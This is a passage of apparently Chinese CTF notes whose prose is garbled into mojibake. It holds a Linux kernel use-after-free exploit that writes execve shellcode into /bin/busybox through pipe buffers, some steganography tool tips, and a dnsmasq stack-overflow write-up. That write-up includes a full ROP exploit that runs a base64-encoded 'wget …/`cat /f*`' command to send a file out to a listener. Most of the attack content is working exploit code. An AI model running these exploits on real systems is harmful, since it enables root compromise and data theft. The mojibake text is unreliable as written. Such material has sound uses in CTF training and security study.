    close(fd);
    
    return true;
}
```





exp.c

```c
#include "banzi.h"
int add(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x20,arg);
}
int del(int fd,uint64_t idx){
    uint64_t arg[1] = {idx};
    ioctl(fd,0x30,arg);
}
int main(){
    const char attack_data[] = {106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5};
    char *buf = calloc(1,0x4000);
    char data[0x1000] = { 0 };
    char key[32] = { 0 };
    uint64_t *rop;
    void *stack;
    char *buff;
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    assign_to_core(0);
    save_state();
    fd = open("/dev/kernelpwn",1);
    if(fd < 0){
        puts("Open Error");
        _exit(1);
    }
    puts("[1-1]draining kmalloc-512");
    for(int i = 0;i < 8;i++){
      memset(buf,'a',0x200);
      keys[i] = alloc_key(i,buf,0x110);
    }
    // memset(buf,'b',0x200);
    add(fd,buf);
    del(fd,0);
    puts("[1-2]spray user_key_payload(0x200) and free all keys");
    for(int i = 8;i<73;i++){
      keys[i] = alloc_key(i,buf,0x110);
    }
    for(int i = 0;i<73;i++){
      free_key(i);
    }
    puts("[1-3]spray msg_msg to cross cache attack");
    build_msg(2000);
    memset(msgbuf.mtext,'A',0x200);
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x200-0x30);
    }
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 2;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);
    }
    puts("[1-4]uaf");//æ­¤æ—¶æ¼æ´å¯¹å—å’Œmsg_msgå…±ç”¨ä¸€ä¸ªå †å—
    del(fd,0);
    //é€šè¿‡skb_bufferæ¥å ä½msg_msg
    puts("[2-1]spray skb_buffer to change msg_msg->m_ts leak heap_addr");
    *(uint64_t*)buf = NULL;
    *(uint64_t*)(buf+8) = NULL;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x1000-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    int ss[1000][2];
    for(int i = 0;i < 500;i++){
      if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
          perror("[-] socketpair");
          return -1;
      }
    }
    for(int i = 0;i<200;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    puts("[2-2]leak msg_msg == skb_buffer");//æ­¤æ—¶msg_msgå’Œskb_bufferä¼šå–·åœ¨ä¸€ä¸ªå¯¹å—é‡Œé¢
    int msg_key,skb_key;
    uint64_t heap_addr,heap_addr1;
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x1000-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-3]leak heap_addr");//é€šè¿‡æ³„æ¼å †åœ°å€æ¥é€ msg_msgä¸Šçš„ä»»æ„msg_msgçš„free
    if(msg_key != 0){
      for(int i = 0;i<(0x1000-0x30)/0x8;i++ ){
        printf("%d => %llx\n",i,*(uint64_t*)(buf + i*8) );
        if(*(uint64_t*)(buf + i*8) == 1 && *(uint64_t*)(buf + (i+1)*8) == 0x1d0 ){
          heap_addr = *(uint64_t*)(buf + (i-2)*8);
          heap_addr1 = *(uint64_t*)(buf + (i-1)*8);
          printf("heap leak: 0x%llx\n",heap_addr);
          break;
        }
      }
    }
    puts("[2-4]free skb_buffer to hijack msg_msg");//é€ ä»»æ„msg_msg free
    if (read(ss[skb_key][1], buf, 0x200-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)buf = heap_addr;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x200-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 200;i<300;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x200-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        // msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-5] free 0x400 msg_msg");
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 0x2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 300;i<310;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    //show_msgæ˜¯ä»¥idxä¸ºåŸºå‡†çš„
    int skb_buf1,skb_buf2;
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf1 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf1 :%d\n",*(uint64_t*)(buf + 8*3));
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 2;
    *(uint64_t*)(buf+8*3) = 0x400-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 310;i<330;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    show_msg(msgqid[msg_key],buf,0x400-0x30,0x1);
    skb_buf2 = *(uint64_t*)(buf + 8*3);
    printf("skb_buf2 :%d\n",*(uint64_t*)(buf + 8*3));
    if (read(ss[skb_buf1][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    //æ•´ç†ç¢ç‰‡
    for(int i = 330;i < 340;i++){
      // *(uint64_t*)(buf+8*8) = i;
      memset(buf,'x',0x400);
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    puts("[3-1] pipe_prime");
    puts("pipe buffer");
    int pipefd[5][2];
    for(int i = 0;i<5;i++){
      if (pipe(pipefd[i]) < 0) {
          perror("[-] pipe");
          return -1;
      }
      memset(buf,"x",0x400);
      const unsigned pipe_size = fcntl(pipefd[i][1], F_GETPIPE_SZ);
      static char buffer[4096];
      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(pipefd[i][1], buffer, n);
        r -= n;
      }

      for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(pipefd[i][0], buffer, n);
        r -= n;
      }
      int attack_fd = open("/bin/busybox",O_RDONLY);
      if(attack_fd < 0){
          perror("open");
          _exit(0);
      }
      loff_t offset = 0x1fdac8;
      splice(attack_fd,&offset,pipefd[i][1], NULL, 1, 0);
    }
    if (read(ss[skb_buf2][1], buf, 0x400-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)(buf + 3*8) = 0x10;
    //æ•´ç†ç¢ç‰‡
    for(int i = 340;i < 370;i++){
      if (write(ss[i][0], buf, 0x400-0x140) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0 ;i< 5;i++){
      if (write(pipefd[i][1],attack_data, sizeof(attack_data)) < 0) {
          perror("[-] write");
          return -1;
      }
    }
    for(int i = 0;i<5;i++){
      close(pipefd[i][1]);
      close(pipefd[i][0]);
    }
    memset(msgbuf.mtext,'\x00',0x400);
    for(int i = 1000;i<1100;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);//é¿å…pipe_bufferå’Œskb_bufferé‡Šæ”¾çš„æ—¶å€™é€ æˆdouble freeçš„é”™è¯¯
    }
    logi("Enter exit");
    // __pause("debug");
    // system("/bin/sh");

}
```





## Misc with CTF ğŸ¤¹

### 0å®½éšå†™ä¸€æŠŠé”

https://yuanfux.github.io/zero-width-web/

### 2å¼ å›¾ç‰‡ç›²æ°´å°

ç”¨BlindWaterMark 

```
python bwm.py decode ./ta.png ./tb.png flag.png
python3 bwmforpy3.py decode --oldseed ./ta.png ./tb.png out1.png

python3 bwmforpy3.py decode ./ta.png ./tb.png out1.png
```



### pngéšå†™

zstegä¸€æŠŠæ¢­æ£€æµ‹ lsbéšå†™ ä»¥åŠ pngæ˜¯å¦åŒ…å«å†…å®¹

```bash
zsteg --all 00000646.png
# æå–è§£å‹
zsteg 00000646.png -E b1,r,lsb,xy > 1.zip
```

stegsolve æŸ¥é€šé“å›¾



### MP3Stegoéšå†™

```bash
æ²¡å¯†ç 
./Decode.exe -X cipher.mp3
æœ‰å¯†ç 
./Decode.exe -X -P xxx cipher.mp3
```



### åˆ†ç¦»

foremost åˆ†ç¦»æ–‡ä»¶åŒ…å«

```bash
foremost 1.jpg
```



### äºŒç»´ç æ‰«ç 

https://merricx.github.io/qrazybox/

### zipä¼ªåŠ å¯†

504B0102 ï¼šç›®å½•åŒº å…¨å±€æ–¹ä½æ ‡è®°ä¸º0900==åŠ å¯†/0000 == æ— åŠ å¯†

504B0304 ï¼šæ•°æ®åŒº 0900==åŠ å¯† 

![CTF misc zipã€raræ–‡ä»¶ä¼ªåŠ å¯†_æ•°æ®åŒº](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/17110420_62abef34087ca67794.png)

### rot47è§£å¯†

https://rot47.net/

```
2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj
```

## Pwn challenge ğŸ¤º

### 2022ACTF master_of_dns

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155042.png)

é¢˜ç›®èµ·äº†ä¸€ä¸ªdnsæœåŠ¡å™¨ï¼Œé€šè¿‡idaf12æœç´¢ç‰ˆæœ¬å·å¯ä»¥çŸ¥é“ç‰ˆæœ¬ä¸º
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155141.png)

ä¸‹è½½ä¸€ä¸ªdnsmasqè¿›è¡Œç¼–è¯‘ï¼Œè¿™é‡Œè¿˜è¦æ³¨æ„ç¼–è¯‘çš„gccç‰ˆæœ¬
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155352.png)

```
wget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz
tar -zxvf dnsmasq-2.86.tar.gz
cd dnsmasq-2.86
æ·»åŠ 
# CFLAGS        = -m32 -fno-stack-protector
# LDFLAGS       = -m32 -no-pie
make
```

ç¼–è¯‘å¥½äº†ä»¥åç”¨idaè¿›è¡Œbinddiffï¼Œé€‰æ‹©ç›¸ä¼¼åº¦ä¸ä¸ºç™¾åˆ†ä¹‹ç™¾çš„å‡½æ•°è¿›è¡ŒæŸ¥çœ‹ï¼Œå…¶ä¸­extract_nameå‡½æ•°ä¸­ï¼Œé¢˜ç›®ç»™çš„ç‰ˆæœ¬å¤šäº†ä¸€ä¸ªmemcpyå‡½æ•°ï¼Œç”±äºæ²¡æœ‰PIEï¼Œæˆ‘ä»¬ç›´æ¥ä¸‹æ–­ç‚¹ï¼Œçœ‹å®ƒçš„å‚æ•°
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155509.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155645.png)


![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227132854.png)

ç»“åˆIDAçœ‹æ ˆæ˜¯0x381+4=0x385çš„æº¢å‡ºï¼ŒåŒæ—¶æº¢å‡ºçš„næ˜¯æœ‰é™åˆ¶çš„ï¼Œä½†æ˜¯ä»»ç„¶æ»¡è¶³æ ˆæº¢å‡ºæ¡ä»¶

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227155756.png)

ç¼–å†™è„šæœ¬ç¡®è®¤æº¢å‡ºï¼Œç”±äºä¸çŸ¥é“æŠ¥æ–‡çš„å…·ä½“å‘é€æ–¹å¼ï¼Œå¸¸è§„æ€è·¯å¯èƒ½ä¼šé€‰æ‹©é€†å‘æŠ¥æ–‡ï¼Œä½†è¿™é‡Œå¯ä»¥ç”¨winsharkæŠ“åŒ…(è¿™é‡ŒUDP BPæ„Ÿè§‰åº”è¯¥æŠ“ä¸äº†)
```shell
dig @127.0.0.1 -p 9999 baidu.com
```

ç”±äºæœ¬åœ°æœåŠ¡èµ·åœ¨127.0.0.1ä¸Šï¼Œç›‘å¬loå³å¯ï¼Œå¾ˆå¿«å°±æŠ“åˆ°äº†æŠ¥æ–‡ï¼Œä½†æ˜¯æ•°æ®åŒ…æ—¶dataæ ¼å¼ï¼Œè¿™é‡Œå³é”®dataï¼Œé€‰æ‹©åè®®é¦–é€‰é¡¹
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227160517.png)

ç„¶åå°±èƒ½æ­£å¸¸è¯†åˆ«äº†ï¼Œè§‚å¯ŸæŸ¥è¯¢è¯·æ±‚çš„åŒ…ï¼Œç”±äºæº¢å‡ºéƒ¨åˆ†åªæ˜¯åŸŸåéƒ¨åˆ†ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨åŸŸå
è¿™ä¸ªåŒ…é‡Œå¿…é¡»å­—æ®µä¸ºDomain Name Systemè¿™ä¸ªæ®µ
åœ¨dnsè¯·æ±‚æŠ¥æ–‡ä¸­ï¼ŒåŸŸåå­—æ®µï¼Œé€šè¿‡"."åˆ†éš”å¼€ï¼Œç‚¹ä¸ç‚¹ä¹‹é—´çš„å­—ç¬¦ä¸ªæ•°å¿…é¡»<=0x3f
è€Œä¸”ä¼šæŠŠbaidu.comå…¶ä¸­çš„ç‚¹æ‹†æˆé•¿åº¦ \x05 baidu \x03 com \x00
æˆ‘ä»¬ä¿ç•™è¿™ä¸€æ®µçš„å¤´å°¾ï¼Œå°±æ›¿æ¢åŸŸåéƒ¨åˆ†ï¼Œ'\x3f'+'a'\*0x3fä¸ºä¸€æ®µï¼Œå…±é•¿0x40ï¼Œæˆ‘ä»¬ç»™0x10è¯•è¯•
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227160536.png)

ç¡®è®¤èƒ½æº¢å‡ºåï¼Œè¿›ä¸€æ­¥è°ƒæ•´é•¿åº¦0x385ï¼Œå°è¯•æ§åˆ¶æ‰§è¡Œæµåˆ°beef

```python

head = "24b401200001000000000001".decode("hex")
payload = ("\x3f"+'a'*0x3f)*14+"\x04aaaa"
payload += "\x04beef"

end =  '\x00'+"00010001".decode("hex")

s(head+payload+end)
```

ä¹Ÿæ²¡é—®é¢˜ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•å¸¦flagå›æ¥äº†ï¼Œè¿™é‡Œæ˜¯UDPï¼Œå†ä¸€ä¸ªORWç¡®å®éº»çƒ¦ã€‚è¿™é‡Œè€ƒè™‘ç”¨systemæˆ–è€…popenæ‰§è¡Œåå¼¹shellè¯­å¥ã€‚è¿™é‡Œåˆ©ç”¨wgetå»è·å–127.0.0.1/flag{xxx}ï¼Œç„¶åå¦ä¸€ç«¯åœ¨80ç«¯å£ç›‘å¬å³å¯æ‹¿åˆ°ç»“æœ

```python
# cmd = b'wget `echo -e "%s"`/`cat /flag`' % (vps.replace(b'.',b'\\x2e'))
cmd = b"echo d2dldCAxMjcuMC4wLjEvYGNhdCAvZipgCg== | base64 -d | sh"
# wget 127.0.0.1/`cat /f*`


nc -l 80

âœ  attachment sudo nc -l 80
GET /flag%7Bpwnbye4l4%7D HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 127.0.0.1
Connection: Keep-Alive
Connection: Keep-Alive

```

ç¨‹åºé‡Œæ­£å¥½æœ‰popenå‡½æ•°ï¼Œç„¶åå°±æ˜¯æ‰¾gadgetç»™å‚æ•°èµ‹å€¼
+ popençš„2ä¸ªå‚æ•°å¿…é¡»éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œ"r"æœ‰äº†ï¼Œä½†æ˜¯cmdè¿˜æ²¡æœ‰
+ ä¸èƒ½æœ‰ç©ºå­—ç¬¦

```c
.text:08071802 52                            push    edx                             ; modes
.text:08071803 50                            push    eax                             ; command
.text:08071804 E8 37 93 FD FF                call    _popen
```

è§‚å¯Ÿcrashæ—¶çš„æ ˆçŠ¶æ€
edxä¸ºmemcpyèµ‹å€¼æ ˆåœ°å€çš„å¼€å§‹ï¼Œä½†edxæ˜¯ç¬¬äºŒä¸ªå‚æ•°çš„èµ‹å€¼å¯„å­˜å™¨ï¼Œåªéœ€è¦"r"ï¼Œä¸éœ€è¦æˆ‘ä»¬è¾“å…¥ï¼Œè€Œeaxæˆ‘ä»¬ç¼ºéš¾ä»¥èµ‹å€¼ä¸ºæœ‰æ•ˆçš„åœ°å€(è¿™é‡Œ2ä¸ªå‚æ•°éƒ½æ˜¯åœ°å€)ï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨gadgetå°†edxçš„å€¼èµ‹å€¼ç»™eax

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231227161823.png)

è¿™é‡Œæœ‰å¤šå¯ä»¥è€ƒè™‘çš„æ±‡ç¼–æŒ‡ä»¤

```
xchg äº¤æ¢å¯„å­˜å™¨
add åŠ å‡ ç»™ä¸€ç›®æ ‡å¯„å­˜å™¨èµ‹0ä¹Ÿèƒ½å®ç°æ•ˆæœ

ROPgadget --binary ./dns  | grep  "xchg eax, edx"
ROPgadget --binary ./dns  | grep  "add eax, edx" | grep ret
ROPgadget --binary ./dns  | grep  "xor eax, eax"
ROPgadget --binary ./dns  | grep ret |grep  "mov eax, 0"
ROPgadget --binary ./dns  | grep ret | grep -v "ret " | grep  ": add eax, 0x"
```

ç»“åˆè¿™å‡ ç‚¹æœ€ç»ˆçš„æ€è·¯æ˜¯ï¼Œç»™eaxä¸€ä¸ªè´Ÿæ•°ï¼Œè¿™æ ·åªéœ€è¦å¯¹å®ƒè¿›è¡Œaddæ“ä½œå°±èƒ½æ§åˆ¶eaxçš„å€¼ã€‚é—®é¢˜åœ¨äºpayloadåªèƒ½è¿ç»­0x3fï¼Œæ‰€ä»¥è¦æ§åˆ¶ROPçš„éƒ¨åˆ†åœ¨0x3fä»¥å†…ï¼Œè¿˜å¥½æ˜¯32ä½æ¯”è¾ƒå¥½å®ç°ã€‚æ­£å¥½æº¢å‡ºé•¿åº¦èƒ½æ»¡è¶³2æ®µROPï¼Œä¸€æ®µæ”¾ROPï¼Œä¸€æ®µæ”¾cmdå­—ç¬¦ä¸²ã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ç›´æ¥æŠŠcmdæ”¾åœ¨å¼€å¤´å¥½ä¸å¥½ï¼Œåœ¨å®é™…æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå¯¼è‡´åœ¨æ‰§è¡Œå‡½æ•°æ—¶ä¼šå‘ä½ä½å¢é•¿ï¼Œå¯èƒ½ä¼šæŠŠcmdè¦†ç›–æ‰å¯¼è‡´æ— æ³•é¡ºåˆ©æ‰§è¡Œã€‚æœ€å¥½çš„æƒ…å†µè¿˜æ˜¯æ”¾åˆ°é«˜ä½ä¸Šã€‚

å†™EXPçš„tips

```python
# åœ¨python2ä¸‹
head = "61".decode("hex")
# å°†å…¶è¯†åˆ«ä¸º16è¿›åˆ¶æ•°çš„æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå°†å…¶è½¬åŒ–ä¸ºå­—èŠ‚æµ


# system(cmd)/popen(cmd,"r"/"w")
cmd_string = base64.b64encode("wget 127.0.0.1/`cat /f*`")
cmd = "echo {} | base64 -d | sh".format(cmd_string)

```


EXP

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256
from scapy.all import *
import base64

p = remote("127.0.0.1","9999",typ="udp")
# p = process("./pwn")
elf = ELF("./dns")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


pop_rax = 0x08059d44
add_eax_xxx = 0x08094d60 # : add eax, 0x11038 ; nop ; pop ebp ; ret
add_eax_edx = 0x0804b639 # : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret
pop_edx = 0x0807ec72 # : pop edx ; ret
popen = 0x08071802


head = "24b401200001000000000001".decode("hex")
end =  '\x00'+"00010001".decode("hex")


pay = p32(pop_rax) + p32(0xfffef38d)
pay += p32(add_eax_xxx)+'aaaa'+p32(add_eax_edx)+'aaaa'*6
pay += p32(pop_edx) +p32(0x0809C7B2)# r
pay += p32(popen)


cmd_string = base64.b64encode("wget 127.0.0.1/`cat /f*`")
cmd = "echo {} | base64 -d | sh".format(cmd_string)


payload = head
payload += ("\x3f"+'a'*0x3f)*14+"\x04aaaa"
payload += '\x3f'+ pay.ljust(0x3f,'a') # 0x385+0x40=0x3c5  0x11038+0xfffef38d=0x3c5
payload += chr(len(cmd)).encode()+ cmd
payload += end

# # print(hex(len(pay))) 0x38

s(payload)


ia()
```


### 2022ACTF mykvm

ä¸€é“kvmçš„é¢˜ç›®

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228191717.png)

ä¸»å‡½æ•°ä¼šmallocä¸€ä¸ª0x20çš„å †å—æ”¾ç½®åœ¨bssæ®µä¸Šä»¥å­˜å‚¨hostname

ç„¶åå°±æ˜¯è¾“å…¥codeä»£ç ï¼Œä»¥åŠguest name å’Œ guest passwd ï¼Œç„¶åè¿›å…¥ä¸€ä¸ªKVMçš„å‡½æ•°å®ç°è™šæ‹Ÿæœºæ‰§è¡Œå‘½ä»¤

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231228191749.png)

kvmå‡½æ•°å¦‚ä¸‹ï¼Œkvmçš„å¯åŠ¨å¯ä»¥å‚ç…§APIæ–‡æ¡£ï¼Œhttps://lwn.net/Articles/658511/ï¼Œå…¶ä¸­æ¶‰åŠå¾ˆå¤šå®çš„ä½¿ç”¨

```c
KVM_CREATE_VM 0xae01
KVM_SET_USER_MEMORY_REGION 0x4020ae46
KVM_CREATE_VCPU 0xae41
KVM_GET_VCPU_MMAP_SIZE 0xae04
KVM_GET_REGS 0x8090ae81
KVM_SET_REGS 0x4090ae82
KVM_GET_SREGS 0x8138ae83
KVM_SET_SREGS 0x4138ae84
KVM_RUN 0xae80
```


```c
unsigned __int64 __fastcall sub_400B92(const void *code, size_t codesize)
{
  int kvmfd; // [rsp+10h] [rbp-220h]
  int vmfd; // [rsp+14h] [rbp-21Ch]
  int vcpu; // [rsp+1Ch] [rbp-214h]
  size_t vcpu_mmap_size; // [rsp+30h] [rbp-200h]
  kvm_run *run_mem; // [rsp+38h] [rbp-1F8h]
  kvm_userspace_memory_region region; // [rsp+40h] [rbp-1F0h] BYREF
  char v9[48]; // [rsp+60h] [rbp-1D0h] BYREF
  __int64 v10; // [rsp+90h] [rbp-1A0h]
  kvm_regs guest_regs; // [rsp+E0h] [rbp-150h] BYREF
  unsigned __int64 v12; // [rsp+228h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  kvmfd = open("/dev/kvm", 0x80002); //è¿™éƒ¨åˆ†ä»£ç æ‰“å¼€ /dev/kvm è®¾å¤‡ï¼Œè·å– KVM æ–‡ä»¶æè¿°ç¬¦ã€‚å¦‚æœæ‰“å¼€å¤±è´¥ï¼Œç¨‹åºå°†é€€å‡ºã€‚
  if ( kvmfd == -1 )
    errx(1, "failed to open /dev/kvm");
  vmfd = ioctl(kvmfd, 0xAE01uLL, 0LL); //ä½¿ç”¨ ioctl ç³»ç»Ÿè°ƒç”¨å’ŒKVM æ–‡ä»¶æè¿°ç¬¦æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿæœºï¼Œå¹¶è·å–è™šæ‹Ÿæœºçš„æ–‡ä»¶æè¿°ç¬¦ã€‚
  memcpy(
    (&unk_602100 - (((((&unk_602100 >> 31) >> 20) + &unk_602100) & 0xFFF) - ((&unk_602100 >> 31) >> 20)) + 4096),// 0x603000
    code,
    codesize);// è¿™é‡Œæ˜¯è®©å‡½æ•°åœ°å€å–æ•´ï¼Œ0x602100 -> 0x603000
  region.slot = 0; // è®¾ç½®ä¸€ä¸ªå†…å­˜åŒºåŸŸï¼ˆkvm_userspace_memory_regionï¼‰ï¼ŒåŒ…æ‹¬è™šæ‹Ÿæœºå†…çš„ç‰©ç†åœ°å€ã€å¤§å°ä»¥åŠå¯¹åº”çš„ç”¨æˆ·ç©ºé—´åœ°å€ã€‚è¿™ä¸ªå†…å­˜åŒºåŸŸéšåé€šè¿‡ ioctl è°ƒç”¨æ·»åŠ åˆ°è™šæ‹Ÿæœºä¸­ã€‚
  region.flags = 0;
  region.guest_phys_addr = 0LL;
  region.memory_size = 0x40000000LL;
  region.userspace_addr = (&unk_602100
                         - (((((&unk_602100 >> 31) >> 20) + &unk_602100) & 0xFFF)
                          - ((&unk_602100 >> 31) >> 20))
                         + 4096);
  ioctl(vmfd, 0x4020AE46uLL, &region);
  vcpu = ioctl(vmfd, 0xAE41uLL, 0LL); //åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿ CPU å¹¶è·å–ç›¸å…³çš„ä¿¡æ¯ï¼Œå¦‚ mmap å¤§å°ï¼Œç„¶åå°†å…¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚ vcpuä½œç”¨äºå®æ¨¡å¼
  vcpu_mmap_size = ioctl(kvmfd, 0xAE04uLL, 0LL);
  run_mem = mmap(0LL, vcpu_mmap_size, 3, 1, vcpu, 0LL);
